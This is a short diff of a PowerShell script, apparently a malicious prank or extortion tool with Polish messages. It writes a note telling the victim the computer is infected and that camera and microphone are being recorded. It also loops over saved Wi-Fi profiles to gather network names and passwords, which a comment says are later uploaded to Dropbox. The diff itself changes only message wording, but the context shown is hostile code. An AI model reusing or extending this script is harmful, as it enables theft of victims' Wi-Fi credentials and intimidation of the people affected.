@@ -76,7 +76,7 @@ $fn = Get-Name
 echo "Czesc! Niestety nie mam dobrych wiadomosci dla ciebie..." $fn >> $Env:temp\foo.txt
 
 echo "`nTwoj komputer zostal zainfekowany" >> $Env:temp\foo.txt
-echo "`nOd teraz obraz z kamery oraz dźwięk z mikrofonu jest nagrywany" >> $Env:temp\foo.txt
+echo "`nOd teraz obraz z kamery oraz dzwiek z mikrofonu jest nagrywany" >> $Env:temp\foo.txt
 #############################################################################################################################################
 
 <#
@@ -236,7 +236,7 @@ Foreach($WLANProfileName in $WLANProfileNames){
 
 	# This is the name of the file the networks and passwords are saved to and later uploaded to the DropBox Cloud Storage
 
-	echo "`nZapisane polaczenia z internetem: ===============================" $WLANProfileObjects >> $Env:temp\foo.txt
+	echo "`nZapisane polaczenia z internetem:" $WLANProfileObjects >> $Env:temp\foo.txt
 
 $content = [IO.File]::ReadAllText("$Env:temp\foo.txt")
 	}
